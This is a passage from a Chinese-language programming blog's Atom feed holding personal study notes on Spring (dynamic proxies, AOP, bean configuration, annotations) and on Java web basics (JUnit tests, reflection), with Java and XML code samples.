2021&#x2F;9&#x2F;21 - 16:00</span><br><span class="line"> **&#x2F;</span><br><span class="line">public class main &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Class[] interfaces&#x3D;&#123;UserDao.class&#125;;</span><br><span class="line">        UserImpl userDao&#x3D;new  UserImpl();</span><br><span class="line">        &#x2F;&#x2F;</span><br><span class="line">        UserDao u&#x3D;(UserDao) Proxy.newProxyInstance(main.class.getClassLoader(),interfaces,new UserDaoProxy(userDao));</span><br><span class="line">        u.add(1,3);</span><br><span class="line">    &#125;</span><br><span class="line">               </span><br><span class="line">    static class UserDaoProxy implements InvocationHandler&#123;</span><br><span class="line">         Object obj;</span><br><span class="line">        UserDaoProxy (Object obj)&#123;</span><br><span class="line">            this.obj&#x3D;obj;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;</span><br><span class="line">            &#x2F;&#x2F;方法之前</span><br><span class="line">            System.out.println(&quot;这是在方法之前执行的.....&quot;+method.getName()+&quot;传递的参数是&quot;+ Arrays.toString(args));</span><br><span class="line">            &#x2F;&#x2F;执行</span><br><span class="line">           Object res&#x3D;method.invoke(obj,args);</span><br><span class="line">            &#x2F;&#x2F;执行后</span><br><span class="line">            System.out.println(&quot;方法执行完毕.....&quot;);</span><br><span class="line">            return res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lusir</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/9/21 - 15:59</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserImpl</span> <span class="keyword">implements</span> <span class="title">UserDao</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">update</span><span class="params">(String id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lusir</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/9/21 - 15:58</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserDao</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">update</span><span class="params">(String id)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><h3 id="AOP术语"><a href="#AOP术语" class="headerlink" title="AOP术语"></a>AOP术语</h3><blockquote><ol><li><p>连接点</p><p>类里面哪些方法可以被增强，这些方法是连接点</p></li><li><p>切入点</p><p>实际被增强的方法，成为切入点</p></li><li><p>通知（增强）</p><p>实际增强的逻辑部分为通知</p><p>通知类型</p><ol><li>前置通知  方法前</li><li>后置通知  方法后</li><li>环绕通知   方法前后</li><li>异常通知     </li><li>最终通知   finally</li></ol></li><li><p>切面</p><p>把通知应用到切入点的过程</p></li></ol></blockquote><h3 id="AOP操作"><a href="#AOP操作" class="headerlink" title="AOP操作"></a>AOP操作</h3><blockquote><p>用AspectJ实现Aop操作</p><p>AspectJ  独立Aop框架  一般把他和Spring框架一起使用</p><p>实现方式：</p><ol><li>基于XML配置</li><li>基于注解（经常使用）</li></ol><p>切入点表达式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">作用：对哪个类中的哪个方法进行增强</span><br><span class="line">结构：execution([权限修饰符][返回类型][类的全路径]，[方法名称],([参数列表]))</span><br><span class="line">eg：</span><br><span class="line">execution(* com.lusir.dao.UserDao.add(..))</span><br><span class="line">..表示参数</span><br><span class="line">eg：所有方法增强</span><br><span class="line">execution(* com.lusir.dao.UserDao.*(..))</span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><h3 id="Aop操作（AspectJ注解）"><a href="#Aop操作（AspectJ注解）" class="headerlink" title="Aop操作（AspectJ注解）"></a>Aop操作（AspectJ注解）</h3><blockquote><ol><li><p>创建类，在类里面定义方法</p></li><li><p>创建增强类（编写增强逻辑）</p><p>在增强类里面创建方法，让不同的方法代表不同的通知类型</p></li><li><p>进行通知的配置</p><ol><li>在spring配置文件中，开启注解扫描</li><li>使用注解创建User和UserProxy对象</li><li>在增强类里面添加注解@Aspect</li><li>在spring配置文件中开启生成代理对象</li></ol></li><li><p>配置不同类型的通知</p><ol><li>Before注解表示作为前置通知 ，里面写切入点表达式</li><li>After 后置通知</li><li>AfterReturning  最终通知</li><li>AftrThrowing  异常通知</li><li>Around  环绕通知</li></ol></li><li><p>公共切入点抽取</p><ol><li>加入Pointcut注解</li></ol></li><li><p>有多个增强类对同一个方法增强，设置增强类优先级</p><ol><li>在增强类上添加注解@Order(数字值)，值越小，优先级越高</li></ol></li></ol></blockquote><h2 id="Spring配置文件"><a href="#Spring配置文件" class="headerlink" title="Spring配置文件"></a>Spring配置文件</h2><h3 id="Bean"><a href="#Bean" class="headerlink" title="Bean"></a>Bean</h3><blockquote><p>id  唯一标识</p><p>class   全类名</p><p>scope 指定bean个数   作用域</p><ol><li><p>singleton  默认  单例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">实例化个数为1</span><br><span class="line">实例化时机：spring核心文件被加载时，实例化配置的Bean实例</span><br><span class="line">bean的生命周期：</span><br><span class="line">   对象创建：当应用加载，创建容器时，对象就被创建了</span><br><span class="line">   对象运行：只要容器在，对象就一直活着</span><br><span class="line">   对象销毁：当应用卸载，销毁容器时，对象就被销毁了</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p>prototype  多例的    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">实例化个数为多个</span><br><span class="line">实例化时机：调用getBean()时实例化BEAN</span><br><span class="line">bean的生命周期：</span><br><span class="line">   对象创建：使用对象时创建按新的实例</span><br><span class="line">   对象运行：只要对象在使用，对象就一直活着</span><br><span class="line">   对象销毁：当对象长时间不用时，被JAVA的垃圾回收器回收了</span><br></pre></td></tr></table></figure></li></ol><p>Bean的生命周期配置：</p><ol><li>init-method  指定初始化方法</li><li>destory-method  指定销毁时方法</li></ol><p>Bean实例化方式</p><ol><li><p>工厂静态方式实例化</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.lusir.factory.StaticFactory&quot;</span> <span class="attr">factory-method</span>=<span class="string">&quot;getUserDao&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>工厂实例方法实例化</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;factory&quot;</span> <span class="attr">class</span>=<span class="string">&quot;全类名&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">factory-bean</span>=<span class="string">&quot;factory&quot;</span> <span class="attr">factory-method</span>=<span class="string">&quot;getUserDao&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>无参构造(最常用)</p></li></ol><p>Bean的依赖注入</p><ol><li>构造方法</li><li>set方法</li></ol><p>Bean的分类</p><ol><li><p>普通Bean   在XML中定义什么返回什么</p></li><li><p>工厂Bean</p><p>创建类，让这个类作为工厂bean，实现接口FactoryBean   getObject方法</p><p>实现接口方法，在实现的方法定义返回的bean类型</p></li></ol></blockquote><h4 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h4><blockquote><ol><li>通过构造器创建Bean实例（无参数构造）</li><li>为bean的属性设置值和对其他bean引用（调用set方法）</li><li>调用bean的初始化的方法（需要进行配值）</li><li>bean使用</li><li>容器关闭时，销毁bean的方法<ol><li>init-method  指定初始化方法</li><li>destory-method  指定销毁时方法</li></ol></li></ol></blockquote><h4 id="Spring自动装配"><a href="#Spring自动装配" class="headerlink" title="Spring自动装配"></a>Spring自动装配</h4><blockquote><p>根据指定装配规则，Spring自动将匹配的属性值注入,</p><p>aotowire可以实现自动装配</p><p>两个参数  byName  byType (相同类型的会出现问题)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;emp&quot;</span> <span class="attr">class</span>=<span class="string">&quot;全类名&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byName&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></blockquote><h4 id="外部文件注入"><a href="#外部文件注入" class="headerlink" title="外部文件注入"></a>外部文件注入</h4><blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;.property文件&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">context:property-placeholder</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//加上表达式  $&#123;property文件的key值&#125;</span><br></pre></td></tr></table></figure></blockquote><h2 id="Spring相关Api"><a href="#Spring相关Api" class="headerlink" title="Spring相关Api"></a>Spring相关Api</h2><blockquote><ol><li><p>ClassPathXmlApplicationContext</p><p>从类的根路径下加载配置文件</p></li><li><p>FileSystemXmlApplicationContext</p><p>从磁盘路径上加载配置文件   绝对地址</p></li><li><p>AnnotationConfigApplicationContext</p><p>使用注解配置容器时，用此类来创建spring容器</p></li></ol><p>getBean()</p><ol><li>参数1   string id</li><li>参数2   Class 类型</li></ol></blockquote><h2 id="Spring注解开发"><a href="#Spring注解开发" class="headerlink" title="Spring注解开发"></a>Spring注解开发</h2><h3 id="Spring原始注解"><a href="#Spring原始注解" class="headerlink" title="Spring原始注解"></a>Spring原始注解</h3><p>注解可以作用在类上，方法上面，属性上面</p><p>注解目的：让配置更加简洁</p><blockquote><p>注解扫描：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context</span> <span class="attr">:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.aaaa&quot;</span>&gt;</span>&lt;/context :component-scan&gt;</span><br></pre></td></tr></table></figure><p>@Componeent   创建对象</p><p>@Controller  在WEB层实例化BEAN</p><p>@Autowired//按照数据类型从Spring容器中进行匹配的</p><p>@Qualifier(“Name”)//按照id </p><p>@Resource(name=”userDao”)//相当于上面两个相加</p><p>@Value(“”)//设置普通类型    另外一种使用方法  Value(“${jdbc.driver}”)</p><p>@Scope//设置bean范围</p><p>@PostConstruct  bean 的初始方法</p><p>@PreDestroy  bean的销毁方法</p></blockquote><h3 id="Spring新注解"><a href="#Spring新注解" class="headerlink" title="Spring新注解"></a>Spring新注解</h3><blockquote><p>专门创建一个Spring核心配置类，替代xml配置</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20210920130417.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.cofig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.ComboPooledDataSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> java.beans.PropertyVetoException;</span><br><span class="line"></span><br><span class="line"><span class="comment">//标志该类是Spring的核心配置类</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="comment">//&lt;context:component-scan base-package=&quot;com.itheima&quot;/&gt;</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;com.itheima&quot;)</span></span><br><span class="line"><span class="comment">//&lt;import resource=&quot;&quot;/&gt;</span></span><br><span class="line"><span class="meta">@Import(&#123;DataSourceConfiguration.class&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringCofiguration</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.cofig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.ComboPooledDataSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.PropertySource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> java.beans.PropertyVetoException;</span><br><span class="line"></span><br><span class="line"><span class="comment">//&lt;context:property-placeholder location=&quot;classpath:jdbc.properties&quot;/&gt;</span></span><br><span class="line"><span class="meta">@PropertySource(&quot;classpath:jdbc.properties&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DataSourceConfiguration</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;jdbc.driver&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String driver;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;jdbc.url&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String url;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;jdbc.username&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;jdbc.password&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean(&quot;dataSource&quot;)</span>  <span class="comment">//Spring会将当前方法的返回值以指定名称存储到Spring容器中</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> DataSource <span class="title">getDataSource</span><span class="params">()</span> <span class="keyword">throws</span> PropertyVetoException </span>&#123;</span><br><span class="line">        ComboPooledDataSource dataSource = <span class="keyword">new</span> ComboPooledDataSource();</span><br><span class="line">        dataSource.setDriverClass(driver);</span><br><span class="line">        dataSource.setJdbcUrl(url);</span><br><span class="line">        dataSource.setUser(username);</span><br><span class="line">        dataSource.setPassword(password);</span><br><span class="line">        <span class="keyword">return</span> dataSource;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="注解归总"><a href="#注解归总" class="headerlink" title="注解归总:"></a>注解归总:</h3><blockquote><p>Configuration把一个类作为一个IoC容器，它的某个方法头上如果注册了@Bean，就会作为这个Spring容器中的Bean。<br>@Scope注解 作用域<br>@Lazy(true) 表示延迟初始化</p><p><strong>@Component泛指组件，当组件不好归类的时候，我们可以使用这个注解进行标注。</strong></p><p><strong>@Repository用于标注数据访问组件，即DAO组件。</strong></p><p>***@Service用于标注业务层组件、<br>***</p><p><em><strong>@Controller用于标注控制层组件（如struts中的action）</strong></em></p><p><strong>@Scope用于指定scope作用域的（用在类上）</strong></p><p><strong>@Autowired 默认按类型装配，如果我们想使用按名称装配，可以结合@Qualifier注解一起使用。如下：</strong><br><strong>@Autowired @Qualifier(“personDaoBean”) 存在多个实例配合使用</strong></p><p><strong>@Resource默认按名称装配，当找不到与名称匹配的bean才会按类型装配。</strong></p><p>*<br>@PostConstruct用于指定初始化方法（用在方法上）<br>@PreDestory用于指定销毁方法（用在方法上）<br>@DependsOn：定义Bean初始化及销毁时的顺序<br>@Primary：自动装配时当出现多个Bean候选者时，被注解为@Primary的Bean将作为首选者，否则将抛出异常<br>@PostConstruct 初始化注解<br>@PreDestroy 摧毁注解 默认 单例 启动就加载<br>@Async异步方法调用*</p></blockquote><h3 id="注解的区分"><a href="#注解的区分" class="headerlink" title="注解的区分"></a>注解的区分</h3><blockquote><ul><li>@Component注解在类上使用表明这个类是个组件类，需要Spring为这个类创建bean。</li><li>@Bean注解使用在方法上，告诉Spring这个方法将会返回一个Bean对象，需要把返回的对象注册到Spring的应用上下文中</li></ul></blockquote><blockquote><p>一、@Value的主要作用有：</p><p>1、获取配置文件中的值。</p><p>@Value(“${spring.application.name:default}”)<br>private String appName;</p><p>含义：如果能找到spring.application.name，找不到spring.application.name就使用default。default就是默认值。<br>2、获取属性中的方法或者属性的值</p><p>@Value(“#{user.name}”)<br>private String myName;</p><p>含义：获取user的name这个属性的值。</p><p>二、@Value(${})和 @Value(#{})的区别</p><p>@Value(${}) 用于获取配置文件中的值<br>@Value(#{}) 用于获取属性中属性的值</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Spring&quot;&gt;&lt;a href=&quot;#Spring&quot; class=&quot;headerlink&quot; title=&quot;Spring&quot;&gt;&lt;/a&gt;Spring&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Ioc(反转控制)  和  Aop&lt;/p&gt;
&lt;p&gt;方便解耦&lt;/p&gt;
&lt;/block</summary>
      
    
    
    
    <category term="技术文档" scheme="https://a2914475618.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
    
    <category term="Spring" scheme="https://a2914475618.github.io/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>Java web</title>
    <link href="https://a2914475618.github.io/2021/09/14/Java-web/"/>
    <id>https://a2914475618.github.io/2021/09/14/Java-web/</id>
    <published>2021-09-14T06:36:56.000Z</published>
    <updated>2021-10-11T03:11:05.536Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-Web"><a href="#Java-Web" class="headerlink" title="Java Web"></a>Java Web</h1><blockquote><p>后期学习路径</p><p>ssm框架  简化web开发的经典框架</p><p>spring boot 简化spring 开发的框架</p><p>spring cloud：微服务开发解决方案</p><p>各种中间件技术：</p><ol><li>redis</li><li>mongodb</li><li>ra’bbi’tmq</li><li>elasticSearch</li></ol><p>容器技术：</p><p>Docker</p><p>业务解决方案</p></blockquote><h2 id="java知识内容补充"><a href="#java知识内容补充" class="headerlink" title="java知识内容补充"></a>java知识内容补充</h2><h3 id="junit单元测试"><a href="#junit单元测试" class="headerlink" title="junit单元测试"></a>junit单元测试</h3><blockquote><p>黑盒测试：关注结果是否正确</p><p>白盒测试：关注程序具体的执行流程</p></blockquote><p>junit：白盒测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;步骤</span><br><span class="line">1.定义一个测试类 名字为 class+Test</span><br><span class="line"></span><br><span class="line">2.定义一个测试方法：可以独立运行</span><br><span class="line">方法名：testADdd</span><br><span class="line">返回值：void</span><br><span class="line">参数列表：空参</span><br><span class="line">3.给方法加@Test</span><br><span class="line">4.导入junit依赖环境</span><br></pre></td></tr></table></figure><blockquote><p>断言：我断言的结果为多少</p><p>Assert.assertEquals</p><p>如果测试的结果与我断言的相同，则测试成功，否则错误</p><p> 注解：</p><p>@Test     单元测试注解</p><p>@Before  在所有的测试方法之前先执行</p><p>@After    在所有的测试方法执行完成后，都会自动执行该方法</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.go.junit.CalcTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.go.clac.clac;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.regexp.internal.RESyntaxException;</span><br><span class="line"><span class="keyword">import</span> org.junit.Assert;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lusir</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/9/14 - 15:09</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CalcTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;init...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@After</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;close...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span>  <span class="title">testAdd</span><span class="params">()</span></span>&#123;</span><br><span class="line">        clac a=<span class="keyword">new</span> clac();</span><br><span class="line">        <span class="keyword">int</span> result=a.add(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">        Assert.assertEquals(<span class="number">3</span>,result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">testDel</span><span class="params">()</span></span>&#123;</span><br><span class="line">        clac b=<span class="keyword">new</span> clac();</span><br><span class="line">        <span class="keyword">int</span> result=b.del(<span class="number">2</span>,<span class="number">1</span>);</span><br><span class="line">        Assert.assertEquals(<span class="number">1</span>, result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h3><blockquote><p>框架设计的灵魂</p><p>框架：半成品软件，简化编码</p><p>反射：将类的各个组成部分封装为其他对象。这就是反射机制</p><ul><li>好处：在程序运行中，操作这些对象</li><li>可以解耦，提高程序的可扩展性</li></ul><p>获取class对象的方式：</p><ol><li>class.forName(“全类名”)：将字节码加载进内存，返回class对象   多用于配置文件，将类名定义在配置文件中。读取文件，加载类</li><li>类名.class:通过类名的属性 class来获取  多用于参数的传递</li><li>对象.getClass:getclass()在object对象中定义   多用于对象的获取字节码的方式</li></ol></blockquote><h4 id="获取class的对象"><a href="#获取class的对象" class="headerlink" title="获取class的对象"></a>获取class的对象</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.go.demo1;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lusir</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/9/14 - 16:02</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception</span>&#123;</span><br><span class="line">        <span class="comment">//1.通过全类名获取</span></span><br><span class="line">        Class cls1=Class.forName(<span class="string">&quot;cn.go.demo1.Person&quot;</span>);</span><br><span class="line">        <span class="comment">//2.类名.class</span></span><br><span class="line">        Class cls2=Person.class;</span><br><span class="line">        <span class="comment">//3.对象.getClass</span></span><br><span class="line">        Person p=<span class="keyword">new</span> Person();</span><br><span class="line">        Class cls3=p.getClass();</span><br><span class="line">        <span class="keyword">if</span> (cls3 == cls1) &#123;</span><br><span class="line">            System.out.println(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(cls1==cls2)&#123;</span><br><span class="line">            System.out.println(<span class="keyword">true</span>);   </span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//结论</span></span><br><span class="line">同一个字节码文件（*.class）在一次程序运行过程中，只会被加载一次，无论通过那种方式获取的<span class="class"><span class="keyword">class</span>对象都是同一个</span></span><br></pre></td></tr></table></figure><h4 id="class的获取Field方法"><a href="#class的获取Field方法" class="headerlink" 